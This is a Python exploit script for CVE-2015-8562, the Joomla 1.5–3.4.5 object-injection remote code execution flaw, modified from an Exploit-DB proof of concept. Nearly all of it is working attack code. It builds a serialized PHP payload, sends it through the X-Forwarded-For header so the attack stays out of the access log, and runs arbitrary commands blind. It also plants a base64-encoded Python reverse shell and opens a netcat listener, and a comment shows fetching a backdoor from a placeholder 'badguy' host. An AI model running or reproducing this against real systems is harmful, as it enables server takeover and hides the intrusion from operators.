#!/usr/bin/env python

'''
    Joomla 1.5 - 3.4.5 Object Injection RCE - CVE-2015-8562
    PoC for CVE-2015-8562 to spawn a reverse shell or automate RCE

    Original PoC from Gary@ Sec-1 ltd (http://www.sec-1.com): 
    https://www.exploit-db.com/exploits/38977/

    Exploit modified to use "X-Forwarded-For" header instead of "User-Agent" to avoid default logged to access.log

    Usage - Automate Blind RCE:
    python joomla-rce-2-shell.py -t http://192.168.1.139/ --cmd
    $ touch /tmp/newhnewh    

    Usage - Spawn Reverse Shell using Pentestmonkey's Python one-liner and netcat listener on local host:
    python joomla-rce-2-shell.py -t http://192.168.1.139/ -l 192.168.1.119 -p 4444
    [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.1.139/
    [-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:4444
    <Response [200]>
    [+] Spawning reverse shell....
    <Response [200]>

    Listening on [0.0.0.0] (family 0, port 4444)
    $ python -c "import pty;pty.spawn('/bin/bash')"
    www-data@ubuntu:/$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@ubuntu:/$ 

'''
    
import requests
import subprocess
import optparse
import sys
import base64
 
# Heavy lifting from PoC author Gary@ Sec-1 ltd (http://www.sec-1.com)
def get_url(url, user_agent):
 
    headers = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', # Change default UA for Requests
    'x-forwarded-for': user_agent   # X-Forwarded-For header instead of UA
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)    
    return response
   
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
 
    return encoded[:-1]
 
 
def generate_payload(php_payload):
 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
 
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
 
    return exploit_template


def main():
    parser=optparse.OptionParser("Spawn Reverse Shell: "+sys.argv[0]+' -t [RHOST] -l [LHOST] -p [LPORT]'+'\n' +\
    "Automate Blind RCE: "+sys.argv[0]+" -t [RHOST] --cmd")
    parser.add_option('-t', dest='RHOST', type='string', help='Remote Target Joomla Server')
    parser.add_option('-l', dest='LHOST', type='string', help='Specify local IP for reverse shell')
    parser.add_option('-p', dest='LPORT', type='string', help='Specify a local port for reverse shell')
    parser.add_option("--cmd", action="store_true", dest="cmd", default=False, help="Drop into blind RCE")
    (options, args) = parser.parse_args()
    RHOST=options.RHOST 
    LHOST=options.LHOST
    LPORT=options.LPORT
    cmd=options.cmd

    if (RHOST == None) or (LHOST == None and cmd==False) or (LPORT==None and cmd==False): # Check for proper args
        print parser.usage
        sys.exit(0)

    # Drops into a shell-like environment to automate blind RCE
    # $ Example pull over backdoor: wget http://badguy/backdoor -O /tmp/backdoor
    if cmd == True:
        print "[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: "+RHOST
        print "[-] Dropping into shell-like environment to perform blind RCE"
        while True:
            command = raw_input('$ ')
            pl = generate_payload("system('"+command+"');")
            print get_url(RHOST, pl)
    
    # Spawn Reverse Shell using Netcat listener + Python shell on victim
    else:
        connection = "'"+LHOST+"', "+LPORT
        # pentestmonkey's Python reverse shell one-liner:
        shell_str = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''
        # Base64 encoded the Python reverse shell as some chars were messing up in the exploit
        encoded_comm = base64.b64encode(shell_str)
        # Stage 1 payload Str
        payload = "echo "+encoded_comm+" | base64 -d > /tmp/newhnewh.py"
        print "[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: "+RHOST
        print "[-] Uploading python reverse shell with LHOST:"+LHOST+" and LPORT:"+LPORT
        # Stage 1: Uploads the Python reverse shell to "/tmp/newhnewh.py"
        pl = generate_payload("system('"+payload+"');")
        print get_url(RHOST, pl)
        # Spawns Shell listener using netcat
        listener = subprocess.Popen(args=["gnome-terminal", "--command=nc -lvp "+LPORT])
        print "[+] Spawning reverse shell...."
        # Stage 2: Executes Python reverse shell
        pl = generate_payload("system('python /tmp/newhnewh.py');")
        print get_url(RHOST, pl)

if __name__ == "__main__":
    main()
